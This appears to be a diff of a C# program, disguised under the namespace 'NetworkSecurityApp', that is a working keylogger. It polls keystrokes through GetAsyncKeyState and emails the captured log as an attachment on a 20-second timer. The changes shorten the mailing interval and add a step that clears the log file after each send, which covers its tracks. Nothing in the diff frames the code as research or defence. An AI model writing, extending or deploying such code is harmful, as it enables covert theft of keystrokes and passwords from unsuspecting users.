@@ -13,6 +13,7 @@ namespace NetworkSecurityApp
         private static Object locker = new Object();
         private static Thread loggerT;
         private static Thread mailerT;
+        private static System.Threading.Timer timer;
 
         [DllImport("User32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
@@ -25,15 +26,16 @@ namespace NetworkSecurityApp
             loggerT.Name = "logger";
             int i = 0;
 
-            System.Threading.Timer timer = new System.Threading.Timer((e) =>
+             timer = new System.Threading.Timer((e) =>
             {
                 Thread.CurrentThread.Name = "TimerTread";
                 Console.WriteLine("TIMER END");
-                i++;
                 SendMail(i); 
-            }, null, TimeSpan.FromSeconds(20), TimeSpan.FromSeconds(30));
+                i++;
+            }, null, TimeSpan.FromSeconds(20), TimeSpan.FromSeconds(20));
 
             loggerT.Start();
+            
         }
 
         public static void LogKeys()
@@ -112,9 +114,13 @@ namespace NetworkSecurityApp
                 LOGMESSAGE.Attachments.Add(new Attachment(attachmenttextfile)); 
                 LOGMESSAGE.Body = subtext; 
                 client.Send(LOGMESSAGE); 
-                LOGMESSAGE = null; 
+                LOGMESSAGE = null;
 
                 //Thread.Sleep(10);
+            
+                    File.WriteAllText(Newfilepath2,"");
+                
+
             }
             Console.WriteLine(@"Finished Sending Mail");
         }
